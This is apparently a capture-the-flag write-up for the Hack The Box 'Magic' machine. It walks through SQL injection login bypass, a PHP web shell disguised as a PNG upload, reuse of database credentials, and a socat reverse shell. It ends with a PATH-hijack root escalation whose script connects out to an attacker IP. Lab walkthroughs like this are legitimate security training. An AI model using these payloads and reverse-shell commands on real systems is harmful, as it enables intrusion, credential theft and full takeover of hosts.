# User

## nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## web server

`' OR 1=1 #` will log you in to the app:

```
curl -v 'http://magic.htb/login.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Origin: http://magic.htb' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://magic.htb/login.php' -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' -H 'Cookie: PHPSESSID=m1r6hiuv0dpcdl527ndtkencdd' --data "username=' OR 1=1 #&password=magic" --compressed --insecure
```

## upload.php

Some protections are in place, but a well named and crafted file is still executed as php. Append the php to a png file via

`dd if=short-shell.php >> smile.png`

Then upload the file with spaces in the name like `s.php s.png`. Then when accessing `http://magic.htb/images/uploads/s.php%20%20%20s.png` in the browser it
ends up rendering as php and we get a web shell. There's a cron job that periodically removes images from the uploads directory, so it helps to use the initial
shell file to put another webshell in the root.

## Web Shell

`/etc/passwd` contains an entry for theseus, it seems to be publickey only for authentication.

There is username and password in thesues in db.php5:

```php
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

.htaccess looks interesting

```
<FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">
SetHandler application/x-httpd-php
</FilesMatch>
<Files ~ "\.(sh|sql)">
order deny,allow
deny from all
</Files>
```

Uploading adminer.php and connect to the database to get the admin login:
`admin:Th3s3usW4sK1ng`.

## Reverse Shell and Owning User

Use the webshell to setup a reverse shell with socat, then upgrade it. We can't ssh into the machine with a password, but we can `su theseus` and use the admin password in the database. Then we add our public key to `authorized_keys` and we have SSH access.

# Root

Run some enumeration(`suid3num.py`) and find the `sysinfo` command. When running the `sysinfo` command, in `pspy` you see the following commands being run

```
2020/05/10 23:56:31 CMD: UID=0    PID=18077  | lshw -short
2020/05/10 23:56:31 CMD: UID=0    PID=18076  | sh -c lshw -short
2020/05/11 00:08:16 CMD: UID=0    PID=18272  | fdisk -l
2020/05/11 00:08:16 CMD: UID=0    PID=18271  | sh -c fdisk -l
2020/05/11 00:08:16 CMD: UID=0    PID=18276  | free -h
2020/05/11 00:08:16 CMD: UID=0    PID=18275  | sh -c free -h
```

Changing the path will result in our own executable being run. Make an `lshw` file, and add the command for a reverse shell:

```sh
#!\bin\sh

/home/theseus/socat64s exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:44444
```

Make it executable, then modify the path and run sysinfo

`PATH=/home/theseus/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin sysinfo`

Use the reverse shell to grab root.txt
